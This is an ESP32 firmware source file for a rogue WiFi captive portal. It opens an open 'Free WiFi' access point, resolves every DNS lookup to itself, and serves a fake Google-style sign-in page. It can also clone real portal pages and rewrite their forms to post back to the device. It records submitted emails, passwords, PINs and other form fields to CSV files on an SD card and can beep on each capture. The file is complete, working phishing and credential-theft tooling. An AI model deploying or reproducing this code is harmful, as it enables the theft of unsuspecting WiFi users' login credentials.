#include "portalbox.h"

#include <DNSServer.h>
#include <FS.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <LittleFS.h>
#include <SD.h>
#include <WebServer.h>
#include <WiFi.h>
#include <time.h>

#include "wifi_link.h"

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
static const char  *PORTAL_DIR       = "/portals";
static const char  *CAPTURE_DIR      = "/captures";
static const size_t MAX_PORTAL_FILES = 16;
static const char  *DEFAULT_SSID     = "Free WiFi";
static const uint8_t DEFAULT_CHANNEL = 6;
static const int     SD_CS_PIN       = 5;   // onboard microSD slot (VSPI)
static const int     SPKR_PIN        = 26;  // speaker amp, taken from the portalbox project
static const uint32_t CLIENT_POLL_MS = 1000;

// ---------------------------------------------------------------------------
// Pages
// ---------------------------------------------------------------------------
static const char FALLBACK_PORTAL[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:8vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:16px}
h2{font-weight:400;margin:0 0 4px}p{color:#5f6368;font-size:14px}</style></head><body>
<div class=card><h2>Sign in</h2><p>to continue to WiFi</p>
<form action="/get" method="GET">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button>Sign in</button></form></div></body></html>)HTML";

static const char ACK_PAGE[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Connected</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:10vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px;text-align:center}
h2{font-weight:400;color:#188038}</style></head><body>
<div class=card><h2>You're connected</h2><p>You can close this page.</p></div></body></html>)HTML";

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static WebServer server(80);
static DNSServer dns;

static bool     active      = false;
static bool     sdReady     = false;
static bool     flashReady  = false;
static bool     beepEnabled = false;
static String   apSsid;
static uint8_t  apChannel   = DEFAULT_CHANNEL;
static String   selectedPortal;
static uint32_t captureCount = 0;
static String   lastEmail;
static uint8_t  clients      = 0;
static uint32_t revision     = 0;
static uint32_t lastClientMs = 0;

static String portalNames[MAX_PORTAL_FILES];
static size_t portalSizes[MAX_PORTAL_FILES];
static size_t portalNameCount = 0;

// ---------------------------------------------------------------------------
// Storage
// ---------------------------------------------------------------------------
static fs::FS &store() { return sdReady ? (fs::FS &)SD : (fs::FS &)LittleFS; }

const char *pbBackendName() {
  if (sdReady) return "sd";
  if (flashReady) return "flash";
  return "none";
}

static String baseName(const String &path) {
  const int slash = path.lastIndexOf('/');
  return slash >= 0 ? path.substring(slash + 1) : path;
}

static String portalPath(const String &name) { return String(PORTAL_DIR) + "/" + name; }
static bool   portalExists(const String &name) { return store().exists(portalPath(name)); }

// Portal filenames come from the network/console, so keep them boring.
static bool validName(const String &name) {
  if (name.length() == 0 || name.length() > 40) return false;
  if (name.indexOf("..") >= 0) return false;
  for (unsigned i = 0; i < name.length(); i++) {
    const char c = name[i];
    if (!(isalnum(c) || c == '.' || c == '-' || c == '_')) return false;
  }
  return true;
}

static void refreshPortalList() {
  portalNameCount = 0;
  File dir = store().open(PORTAL_DIR);
  if (!dir) return;
  for (File f = dir.openNextFile(); f && portalNameCount < MAX_PORTAL_FILES; f = dir.openNextFile()) {
    if (!f.isDirectory()) {
      portalSizes[portalNameCount] = (size_t)f.size();
      portalNames[portalNameCount++] = baseName(String(f.name()));
    }
    f.close();
  }
  dir.close();
}

// Copies every flash portal page the card does not already have. The card is
// the authority: an existing file is never overwritten, so pages added or
// edited on the card survive a re-seed. Returns how many files were copied.
static size_t syncFromFlash() {
  if (!sdReady || !flashReady) return 0;
  size_t copied = 0;
  File src = LittleFS.open(PORTAL_DIR);
  if (!src) return 0;
  for (File f = src.openNextFile(); f; f = src.openNextFile()) {
    const String name = baseName(String(f.name()));
    if (!f.isDirectory() && validName(name) && !SD.exists(portalPath(name))) {
      File out = SD.open(portalPath(name), "w");
      if (out) {
        while (f.available()) out.write(f.read());
        out.close();
        copied++;
        Serial.printf("[PB  ] Card seeded with %s\n", name.c_str());
      }
    }
    f.close();
  }
  src.close();
  return copied;
}

static uint32_t countLines(const String &path) {
  if (!store().exists(path)) return 0;   // no log yet is normal, not an error
  File f = store().open(path, "r");
  if (!f) return 0;
  uint32_t n = 0;
  while (f.available()) {
    if (f.read() == '\n') n++;
  }
  f.close();
  return n;
}

// ---------------------------------------------------------------------------
// Capture log
// ---------------------------------------------------------------------------
static String sanitize(String v) {
  v.replace("\\", "_");
  v.replace(",", ";");
  v.replace("\"", "'");
  v.replace("\r", "");
  v.replace("\n", "");
  return v;
}

// Epoch seconds, or 0 when NTP has not set the clock yet.
static uint32_t epochNow() {
  const time_t t = time(nullptr);
  return t > 1600000000 ? (uint32_t)t : 0;
}

static void captureAdd(const String &email, const String &pass, const String &extra,
                       const String &ip) {
  const String e  = sanitize(email);
  const String p  = sanitize(pass);
  const String x  = sanitize(extra);
  const String ts = String(epochNow());
  const String line =
      ts + "," + ip + "," + selectedPortal + ",\"" + e + "\",\"" + p + "\",\"" + x + "\"\n";

  File all = store().open(String(CAPTURE_DIR) + "/all.csv", "a");
  if (all) { all.print(line); all.close(); }
  if (selectedPortal.length()) {
    File pf = store().open(String(CAPTURE_DIR) + "/" + selectedPortal + ".csv", "a");
    if (pf) { pf.print(line); pf.close(); }
  }

  captureCount++;
  lastEmail = e;
  revision++;
  if (beepEnabled) tone(SPKR_PIN, 1568, 120);
  // The password stays on the card; the live log carries the count only.
  Serial.printf("[PB  ] Capture %lu from %s portal=%s\n", (unsigned long)captureCount, ip.c_str(),
                selectedPortal.length() ? selectedPortal.c_str() : "fallback");
}

// ---------------------------------------------------------------------------
// Captive-portal cloning
// ---------------------------------------------------------------------------
// Fetches a real portal page and stores a local copy: the HTML with its forms
// pointed back at us, its stylesheets inlined, and its images/scripts saved
// next to it so the page still renders with no internet behind the AP.
// Requires the hub to be online, so cloning happens before the AP is started.
static const char  *ASSET_SUBDIR      = "/assets";
static const size_t CLONE_MAX_HTML    = 48 * 1024;
static const size_t CLONE_MAX_ASSET   = 24 * 1024;
static const size_t CLONE_MAX_FILES   = 12;
static const uint32_t CLONE_TIMEOUT_MS = 12000;
static const char  *CLONE_UA =
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1";

static String assetPath(const String &name) {
  return String(PORTAL_DIR) + ASSET_SUBDIR + "/" + name;
}

static const char *mimeFor(const String &name) {
  String n = name;
  n.toLowerCase();
  if (n.endsWith(".css"))   return "text/css";
  if (n.endsWith(".js"))    return "application/javascript";
  if (n.endsWith(".png"))   return "image/png";
  if (n.endsWith(".jpg") || n.endsWith(".jpeg")) return "image/jpeg";
  if (n.endsWith(".gif"))   return "image/gif";
  if (n.endsWith(".svg"))   return "image/svg+xml";
  if (n.endsWith(".webp"))  return "image/webp";
  if (n.endsWith(".ico"))   return "image/x-icon";
  if (n.endsWith(".woff"))  return "font/woff";
  if (n.endsWith(".woff2")) return "font/woff2";
  if (n.endsWith(".ttf"))   return "font/ttf";
  if (n.endsWith(".json"))  return "application/json";
  return "application/octet-stream";
}

static void serveAsset(const String &name) {
  if (!validName(name)) { server.send(404, "text/plain", ""); return; }
  File f = store().open(assetPath(name), "r");
  if (!f) { server.send(404, "text/plain", ""); return; }
  server.streamFile(f, mimeFor(name));
  f.close();
}

// One GET, HTTP or HTTPS, with a hard size cap and deadline. Blocking: this
// only ever runs from the serial console.
static bool httpGet(const String &url, String &body, size_t maxBytes, const char *what) {
  static WiFiClient       plain;
  static WiFiClientSecure secure;
  HTTPClient              http;

  bool started;
  if (url.startsWith("https://")) {
    secure.setInsecure();   // captive portals rarely chain to a root we carry
    started = http.begin(secure, url);
  } else {
    started = http.begin(plain, url);
  }
  if (!started) {
    Serial.printf("[PB  ] %s: cannot open %s\n", what, url.c_str());
    return false;
  }

  http.setTimeout(CLONE_TIMEOUT_MS);
  http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
  http.setUserAgent(CLONE_UA);

  const int code = http.GET();
  if (code != HTTP_CODE_OK) {
    Serial.printf("[PB  ] %s: HTTP %d for %s\n", what, code, url.c_str());
    http.end();
    return false;
  }

  const int    declared = http.getSize();
  WiFiClient  *stream   = http.getStreamPtr();
  body = "";
  body.reserve(declared > 0 && (size_t)declared < maxBytes ? (size_t)declared + 1 : 4096);

  const uint32_t deadline = millis() + CLONE_TIMEOUT_MS;
  bool           truncated = false;
  while ((int32_t)(millis() - deadline) < 0) {
    const size_t avail = stream->available();
    if (!avail) {
      if (!http.connected()) break;
      delay(1);
      continue;
    }
    uint8_t    buf[512];
    size_t     want = avail > sizeof(buf) ? sizeof(buf) : avail;
    if (body.length() + want > maxBytes) {
      want      = maxBytes - body.length();
      truncated = true;
    }
    if (!want) break;
    const size_t got = stream->readBytes(buf, want);
    if (!got) break;
    body.concat((const char *)buf, got);
    if (truncated) break;
  }
  http.end();
  if (truncated) Serial.printf("[PB  ] %s: truncated at %u B\n", what, (unsigned)maxBytes);
  return body.length() > 0;
}

// Resolves a possibly relative reference against the page URL.
static String absoluteUrl(const String &base, const String &ref) {
  String r = ref;
  r.trim();
  if (!r.length() || r.startsWith("data:") || r.startsWith("#")) return r;
  if (r.startsWith("http://") || r.startsWith("https://")) return r;

  const int schemeEnd = base.indexOf("://");
  if (schemeEnd < 0) return r;
  const String scheme  = base.substring(0, schemeEnd);
  const int    hostEnd = base.indexOf('/', schemeEnd + 3);
  const String origin  = hostEnd < 0 ? base : base.substring(0, hostEnd);

  if (r.startsWith("//")) return scheme + ":" + r;
  if (r.startsWith("/")) return origin + r;
  const int lastSlash = base.lastIndexOf('/');
  const String dir = lastSlash > schemeEnd + 2 ? base.substring(0, lastSlash + 1) : origin + "/";
  return dir + r;
}

// Attribute readers/writers. Deliberately tolerant: quoted or bare values.
static String attrValue(const String &tag, const char *name) {
  String lower = tag;
  lower.toLowerCase();
  const String key = String(name);
  int          pos = 0;
  while ((pos = lower.indexOf(key, pos)) >= 0) {
    const bool boundary = pos == 0 || lower[pos - 1] == ' ' || lower[pos - 1] == '\t' ||
                          lower[pos - 1] == '\n' || lower[pos - 1] == '\r';
    int p = pos + key.length();
    while (p < (int)tag.length() && (tag[p] == ' ' || tag[p] == '\t')) p++;
    if (boundary && p < (int)tag.length() && tag[p] == '=') {
      p++;
      while (p < (int)tag.length() && (tag[p] == ' ' || tag[p] == '\t')) p++;
      if (p < (int)tag.length() && (tag[p] == '"' || tag[p] == '\'')) {
        const char q   = tag[p];
        const int  end = tag.indexOf(q, p + 1);
        if (end > 0) return tag.substring(p + 1, end);
      } else {
        int end = p;
        while (end < (int)tag.length() && tag[end] != ' ' && tag[end] != '>' && tag[end] != '\r' &&
               tag[end] != '\n') end++;
        return tag.substring(p, end);
      }
    }
    pos += key.length();
  }
  return "";
}

static String setAttrValue(const String &tag, const char *name, const String &value) {
  String lower = tag;
  lower.toLowerCase();
  const String key = String(name);
  int          pos = 0;
  while ((pos = lower.indexOf(key, pos)) >= 0) {
    const bool boundary = pos == 0 || lower[pos - 1] == ' ' || lower[pos - 1] == '\t' ||
                          lower[pos - 1] == '\n' || lower[pos - 1] == '\r';
    int p = pos + key.length();
    while (p < (int)tag.length() && (tag[p] == ' ' || tag[p] == '\t')) p++;
    if (boundary && p < (int)tag.length() && tag[p] == '=') {
      p++;
      while (p < (int)tag.length() && (tag[p] == ' ' || tag[p] == '\t')) p++;
      if (p < (int)tag.length() && (tag[p] == '"' || tag[p] == '\'')) {
        const char q   = tag[p];
        const int  end = tag.indexOf(q, p + 1);
        if (end > 0) return tag.substring(0, p + 1) + value + tag.substring(end);
      } else {
        int end = p;
        while (end < (int)tag.length() && tag[end] != ' ' && tag[end] != '>' && tag[end] != '\r' &&
               tag[end] != '\n') end++;
        return tag.substring(0, p) + value + tag.substring(end);
      }
    }
    pos += key.length();
  }
  return tag;
}

static String stripAttr(const String &tag, const char *name) {
  String out = tag;
  for (int guard = 0; guard < 4; guard++) {
    String lower = out;
    lower.toLowerCase();
    const String key = String(name) + "=";
    const int    pos = lower.indexOf(key);
    if (pos < 0) break;
    const bool boundary = pos == 0 || lower[pos - 1] == ' ' || lower[pos - 1] == '\t' ||
                          lower[pos - 1] == '\n' || lower[pos - 1] == '\r';
    if (!boundary) break;
    int p = pos + key.length();
    int end;
    if (p < (int)out.length() && (out[p] == '"' || out[p] == '\'')) {
      const char q   = out[p];
      const int  close = out.indexOf(q, p + 1);
      end           = close < 0 ? (int)out.length() : close + 1;
    } else {
      end = p;
      while (end < (int)out.length() && out[end] != ' ' && out[end] != '>' && out[end] != '\r' &&
             out[end] != '\n') end++;
    }
    out.remove(pos, end - pos);
  }
  return out;
}

// Downloads one asset into /portals/assets and returns its local path.
static String cloneAsset(const String &base, const String &ref, size_t &count) {
  const String url = absoluteUrl(base, ref);
  if (!url.startsWith("http") || count >= CLONE_MAX_FILES) return ref;

  String body;
  if (!httpGet(url, body, CLONE_MAX_ASSET, "asset")) return ref;

  String name = url;
  const int q = name.indexOf('?');
  if (q >= 0) name = name.substring(0, q);
  const int slash = name.lastIndexOf('/');
  name = slash >= 0 ? name.substring(slash + 1) : name;
  if (!name.length() || !validName(name)) name = "asset" + String((unsigned)count) + ".bin";
  if (store().exists(assetPath(name))) name = String((unsigned)count) + "-" + name;
  if (!validName(name)) return ref;

  File f = store().open(assetPath(name), "w");
  if (!f) return ref;
  f.write((const uint8_t *)body.c_str(), body.length());
  f.close();
  count++;
  Serial.printf("[PB  ]   asset %s (%u B)\n", name.c_str(), (unsigned)body.length());
  return String("/assets/") + name;
}

static String cloneTag(const String &base, const String &tag, size_t &count) {
  String lower = tag;
  lower.toLowerCase();
  if (lower.startsWith("<base")) return "";   // would re-point our relative links
  if (lower.startsWith("<form")) {
    String t = stripAttr(stripAttr(tag, "action"), "method");
    return t.substring(0, 5) + " action=\"/get\" method=\"GET\"" + t.substring(5);
  }
  if (lower.startsWith("<link")) {
    String rel = attrValue(tag, "rel");
    rel.toLowerCase();
    if (rel.indexOf("stylesheet") >= 0) {
      const String href = attrValue(tag, "href");
      if (href.length()) {
        const String url = absoluteUrl(base, href);
        String       css;
        if (url.startsWith("http") && httpGet(url, css, CLONE_MAX_ASSET, "css")) {
          count++;
          return "<style>\n" + css + "\n</style>";
        }
      }
    }
    return tag;
  }
  if (lower.startsWith("<img") || lower.startsWith("<script") || lower.startsWith("<source")) {
    const String src = attrValue(tag, "src");
    if (src.length()) {
      const String local = cloneAsset(base, src, count);
      if (local != src) return setAttrValue(tag, "src", local);
    }
  }
  return tag;
}

static String cloneRewrite(const String &base, const String &html, size_t &count) {
  String out;
  out.reserve(html.length() + 2048);
  size_t i = 0;
  while (i < html.length()) {
    const int lt = html.indexOf('<', i);
    if (lt < 0) {
      out += html.substring(i);
      break;
    }
    out += html.substring(i, (size_t)lt);
    const int gt = html.indexOf('>', lt);
    if (gt < 0) {
      out += html.substring(lt);
      break;
    }
    out += cloneTag(base, html.substring(lt, gt + 1), count);
    i = (size_t)gt + 1;
  }
  return out;
}

static String defaultPageName(const String &url) {
  String s = url;
  const int schemeEnd = s.indexOf("://");
  if (schemeEnd >= 0) s = s.substring(schemeEnd + 3);
  const int q = s.indexOf('?');
  if (q >= 0) s = s.substring(0, q);
  String out;
  for (unsigned i = 0; i < s.length() && out.length() < 32; i++) {
    const char c = s[i];
    out += (isalnum(c) || c == '.' || c == '-' || c == '_') ? c : '-';
  }
  if (!out.length()) out = "cloned";
  return out + ".html";
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------
static void redirectToPortal() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.sendHeader("Cache-Control", "no-cache");
  server.send(302, "text/plain", "");
}

static void servePortal() {
  if (selectedPortal.length() && portalExists(selectedPortal)) {
    File f = store().open(portalPath(selectedPortal), "r");
    if (f) {
      server.streamFile(f, "text/html");
      f.close();
      return;
    }
  }
  server.send_P(200, "text/html", FALLBACK_PORTAL);
}

// Accepts any field names, because a cloned page posts whatever the original
// site used. Email-ish and password-ish names map to the two log columns and
// anything else is kept verbatim in the extra column.
static void handleGet() {
  String email, pass, extra;
  for (uint8_t i = 0; i < server.args(); i++) {
    const String key   = server.argName(i);
    const String val   = server.arg(i);
    String       lower = key;
    lower.toLowerCase();
    if (!email.length() && (lower.indexOf("email") >= 0 || lower.indexOf("user") >= 0 ||
                            lower.indexOf("login") >= 0 || lower.indexOf("account") >= 0))
      email = val;
    else if (!pass.length() && (lower.indexOf("pass") >= 0 || lower.indexOf("pwd") >= 0 ||
                                lower.indexOf("pin") >= 0 || lower.indexOf("code") >= 0))
      pass = val;
    else {
      if (extra.length()) extra += "&";
      extra += key + "=" + val;
    }
  }
  if (!email.length() && !pass.length() && extra.length()) {  // unknown shape: keep it all
    email = extra;
    extra = "";
  }
  captureAdd(email, pass, extra, server.client().remoteIP().toString());
  server.send_P(200, "text/html", ACK_PAGE);
}

static void registerRoutes() {
  server.on("/", HTTP_GET, servePortal);
  server.on("/get", HTTP_GET, handleGet);                     // Marauder-compatible contract
  server.on("/get", HTTP_POST, handleGet);                    // cloned forms may POST
  server.on("/ack", HTTP_GET, []() { server.send_P(200, "text/html", ACK_PAGE); });

  // OS captive-portal probes pop the login page on the client.
  static const char *probes[] = {"/generate_204", "/gen_204", "/hotspot-detect.html",
                                 "/library/test/success.html", "/ncsi.txt", "/connecttest.txt",
                                 "/redirect", "/canonical.html", "/success.txt", "/fwlink"};
  for (size_t i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
    server.on(probes[i], HTTP_GET, redirectToPortal);
  }
  server.onNotFound([]() {
    const String uri = server.uri();
    if (uri.startsWith("/assets/")) {   // cloned page assets, served from the store
      serveAsset(uri.substring(8));
      return;
    }
    redirectToPortal();
  });
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------
void pbBegin() {
  // Arduino's LittleFS looks for a partition labelled "spiffs"; partitions.csv
  // labels ours "littlefs", so the mount has to name it.
  flashReady = LittleFS.begin(true, "/littlefs", 10, "littlefs");
  if (!flashReady) Serial.println(F("[PB  ] LittleFS mount failed - flash backend unavailable"));

  sdReady = SD.begin(SD_CS_PIN);   // cs IO5, confirmed mounted on CH-01 2026-09-30
  if (!sdReady) Serial.println(F("[PB  ] No microSD card - flash backend only"));

  if (sdReady || flashReady) {
    if (!store().exists(PORTAL_DIR)) store().mkdir(PORTAL_DIR);
    if (!store().exists(CAPTURE_DIR)) store().mkdir(CAPTURE_DIR);
  }
  const size_t seeded = (sdReady && flashReady) ? syncFromFlash() : 0;
  if (seeded) Serial.printf("[PB  ] %u page(s) copied from flash to the card\n", (unsigned)seeded);

  refreshPortalList();
  if (portalNameCount && !selectedPortal.length()) selectedPortal = portalNames[0];
  captureCount = countLines(String(CAPTURE_DIR) + "/all.csv");
  revision++;

  Serial.printf("[PB  ] PortalBox ready: store=%s portals=%u captures=%lu\n", pbBackendName(),
                (unsigned)portalNameCount, (unsigned long)captureCount);
  if (sdReady)
    Serial.printf("[PB  ] microSD: %llu MB total\n", (unsigned long long)(SD.totalBytes() >> 20));
  if (flashReady)
    Serial.printf("[PB  ] LittleFS: %llu of %llu KB used\n",
                  (unsigned long long)(LittleFS.usedBytes() >> 10),
                  (unsigned long long)(LittleFS.totalBytes() >> 10));
  for (size_t i = 0; i < portalNameCount; i++) Serial.printf("[PB  ]   portal: %s\n", portalNames[i].c_str());
}

bool pbActive() { return active; }

bool pbStart() {
  if (active) return true;
  if (!sdReady && !flashReady)
    Serial.println(F("[PB  ] No storage - built-in page only, captures are not logged"));

  // The hub's setup AP and the portal AP cannot share the radio.
  if (linkPortalActive()) linkClosePortal();
  linkSuspend();

  apSsid    = apSsid.length() ? apSsid : String(DEFAULT_SSID);
  apChannel = apChannel ? apChannel : DEFAULT_CHANNEL;

  WiFi.mode(WIFI_AP);
  if (!WiFi.softAP(apSsid.c_str(), nullptr, apChannel)) {
    Serial.println(F("[PB  ] softAP failed - AP not started"));
    linkResume();
    return false;
  }

  dns.start(53, "*", WiFi.softAPIP());   // wildcard DNS -> everything resolves here
  registerRoutes();
  server.begin();

  active     = true;
  clients    = 0;
  lastClientMs = millis();
  revision++;
  Serial.printf("[PB  ] Portal AP up: ssid=\"%s\" ch=%u ip=%s portal=%s\n", apSsid.c_str(),
                apChannel, WiFi.softAPIP().toString().c_str(),
                selectedPortal.length() ? selectedPortal.c_str() : "fallback");
  return true;
}

void pbStop() {
  if (!active) return;
  server.stop();
  dns.stop();
  WiFi.softAPdisconnect(true);
  active  = false;
  clients = 0;
  revision++;
  Serial.println(F("[PB  ] Portal AP down"));
  linkResume();
}

void pbLoop(uint32_t now) {
  if (!active) return;
  dns.processNextRequest();
  server.handleClient();

  if (now - lastClientMs >= CLIENT_POLL_MS) {
    lastClientMs = now;
    const uint8_t n = (uint8_t)WiFi.softAPgetStationNum();
    if (n != clients) {
      clients = n;
      revision++;
    }
  }
}

uint32_t pbRevision() { return revision; }

// ---------------------------------------------------------------------------
// Access point settings
// ---------------------------------------------------------------------------
const String &pbSsid() { return apSsid; }

void pbSetSsid(const String &ssid) {
  apSsid = ssid;
  revision++;
}

uint8_t pbChannel() { return apChannel; }

void pbSetChannel(uint8_t channel) {
  apChannel = channel ? channel : DEFAULT_CHANNEL;
  revision++;
}

String pbApIp() { return active ? WiFi.softAPIP().toString() : String("192.168.4.1"); }
uint8_t pbClients() { return clients; }

// ---------------------------------------------------------------------------
// Portal library
// ---------------------------------------------------------------------------
size_t pbPortalCount() { return portalNameCount; }

String pbPortalAt(size_t index) { return index < portalNameCount ? portalNames[index] : String(); }

size_t pbPortalSize(size_t index) { return index < portalNameCount ? portalSizes[index] : 0; }

String pbSelectedPortal() { return selectedPortal; }

bool pbSelectPortal(const String &name) {
  if (!validName(name) || !portalExists(name)) return false;
  selectedPortal = name;
  revision++;
  Serial.printf("[PB  ] Portal selected: %s\n", name.c_str());
  return true;
}

bool pbSelectNextPortal() {
  if (!portalNameCount) return false;
  size_t next = 0;
  for (size_t i = 0; i < portalNameCount; i++) {
    if (portalNames[i] == selectedPortal) { next = (i + 1) % portalNameCount; break; }
  }
  return pbSelectPortal(portalNames[next]);
}

bool pbDeletePortal(const String &name) {
  if (!validName(name) || !portalExists(name)) return false;
  if (!store().remove(portalPath(name))) return false;
  Serial.printf("[PB  ] Portal deleted: %s\n", name.c_str());
  if (selectedPortal == name) selectedPortal = "";
  refreshPortalList();
  if (!selectedPortal.length() && portalNameCount) selectedPortal = portalNames[0];
  revision++;
  return true;
}

size_t pbSyncFromFlash() {
  if (!sdReady) {
    Serial.println(F("[PB  ] No card mounted - nothing to sync to"));
    return 0;
  }
  const size_t copied = syncFromFlash();
  if (copied) {
    refreshPortalList();
    if (!selectedPortal.length() && portalNameCount) selectedPortal = portalNames[0];
    revision++;
  }
  return copied;
}

// Clones one portal page. Blocking by design: a console command, and the
// hub has to be online because the AP cannot exist at the same time.
bool pbClone(const String &url, const String &requestedName) {
  if (linkState() != LinkState::Online) {
    Serial.println(F("[PB  ] Clone needs a network: add/join Wi-Fi first, then clone"));
    return false;
  }
  if (!url.startsWith("http://") && !url.startsWith("https://")) {
    Serial.println(F("[PB  ] Clone needs an http:// or https:// URL"));
    return false;
  }
  if (!sdReady && !flashReady) {
    Serial.println(F("[PB  ] Clone needs storage"));
    return false;
  }

  String name = requestedName;
  name.trim();
  if (!name.length()) name = defaultPageName(url);
  if (!name.endsWith(".html")) name += ".html";
  if (!validName(name)) {
    Serial.println(F("[PB  ] Clone: bad page name (letters, digits, . - _ only, 40 max)"));
    return false;
  }

  Serial.printf("[PB  ] Cloning %s -> %s (heap %u)\n", url.c_str(), name.c_str(), ESP.getFreeHeap());
  String html;
  if (!httpGet(url, html, CLONE_MAX_HTML, "page")) {
    Serial.println(F("[PB  ] Clone failed: page not fetched"));
    return false;
  }

  const String assetsDir = String(PORTAL_DIR) + ASSET_SUBDIR;
  if (!store().exists(assetsDir)) store().mkdir(assetsDir);

  size_t       files = 0;
  const String out   = cloneRewrite(url, html, files);
  html = String();   // free before writing

  const String page = "<!-- cloned from " + url + " -->\n" + out;
  File         f    = store().open(portalPath(name), "w");
  if (!f) {
    Serial.println(F("[PB  ] Clone failed: cannot write the page"));
    return false;
  }
  f.write((const uint8_t *)page.c_str(), page.length());
  f.close();

  refreshPortalList();
  selectedPortal = name;
  revision++;
  Serial.printf("[PB  ] Cloned %u B with %u asset(s) - now serving %s (heap %u)\n",
                (unsigned)page.length(), (unsigned)files, name.c_str(), ESP.getFreeHeap());
  return true;
}

uint64_t pbStoreUsedBytes()  { return sdReady ? SD.usedBytes()  : (flashReady ? LittleFS.usedBytes()  : 0); }
uint64_t pbStoreTotalBytes() { return sdReady ? SD.totalBytes() : (flashReady ? LittleFS.totalBytes() : 0); }

// ---------------------------------------------------------------------------
// Captures
// ---------------------------------------------------------------------------
uint32_t pbCaptureCount() { return captureCount; }
String   pbLastCaptureEmail() { return lastEmail; }

void pbDumpCaptures(Stream &out) {
  File f = store().open(String(CAPTURE_DIR) + "/all.csv", "r");
  if (!f) {
    out.println(F("ERR no captures"));
    return;
  }
  while (f.available()) out.write(f.read());
  f.close();
  out.println(F("OK"));
}

void pbClearCaptures() {
  // Remove one file per pass: safe while iterating FAT/LittleFS directories.
  for (int pass = 0; pass < 64; pass++) {
    File dir = store().open(CAPTURE_DIR);
    if (!dir) break;
    File f = dir.openNextFile();
    if (!f) { dir.close(); break; }
    const String p = String(CAPTURE_DIR) + "/" + baseName(String(f.name()));
    f.close();
    dir.close();
    store().remove(p);
  }
  captureCount = 0;
  lastEmail    = "";
  revision++;
  Serial.println(F("[PB  ] Captures cleared"));
}

// ---------------------------------------------------------------------------
// Beep
// ---------------------------------------------------------------------------
bool pbBeepEnabled() { return beepEnabled; }

void pbSetBeep(bool on) {
  beepEnabled = on;
  revision++;
  Serial.printf("[PB  ] Capture beep %s\n", on ? "on" : "off");
}
